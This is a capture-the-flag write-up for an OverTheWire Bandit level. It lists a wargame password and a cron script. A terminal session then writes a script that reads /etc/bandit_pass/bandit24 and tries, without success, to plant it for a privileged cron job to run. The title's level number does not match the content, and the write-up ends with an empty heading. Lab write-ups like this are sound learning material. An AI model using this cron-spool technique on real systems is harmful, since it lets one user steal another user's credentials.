# Level 22 -> 23

## Objetivo

-   A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed. Find the password for the next lvl.

## Datos de acceso

-   Host: bandit.labs.overthewire.org
-   Port: 2220
-   User: bandit23
-   Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución

-   Follow the same steps as above, instead of the password, you will find a command, assign the name "bandit23" to myname, then run the command shown. Find the way to discover the password.

```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjo_bandit24
cat: cronjo_bandit24: No such file or directory
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtmp
mkdir: cannot create directory ‘/tmp/passtmp’: File exists
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtempp
bandit23@bandit:/var/spool/bandit24$ cd /tmp/passtempp
bandit23@bandit:/tmp/passtempp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtempp/password" > mio.sh
bandit23@bandit:/tmp/passtempp$ chmod 777 mio.sh
bandit23@bandit:/tmp/passtempp$ cat mio.sh
cat /etc/bandit_pass/bandit24 >> /tmp/passtempp/password
bandit23@bandit:/tmp/passtempp$ touch password
bandit23@bandit:/tmp/passtempp$ chmod 666 password
bandit23@bandit:/tmp/passtempp$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtempp$ ls -la
total 236
drwxrwxr-x   2 bandit23 bandit23   4096 Sep 12 18:50 .
drwxrwx-wt 948 root     root     229376 Sep 12 18:51 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Sep 12 18:50 mio.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Sep 12 18:50 password
bandit23@bandit:/tmp/passtempp$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtempp$ cat password
bandit23@bandit:/tmp/passtempp$ ls -la mio.sh
-rwxrwxrwx 1 bandit23 bandit23 57 Sep 12 18:50 mio.sh
bandit23@bandit:/tmp/passtempp$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Sep 12 18:50 password
bandit23@bandit:/tmp/passtempp$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtempp$
```

Notas adicionales
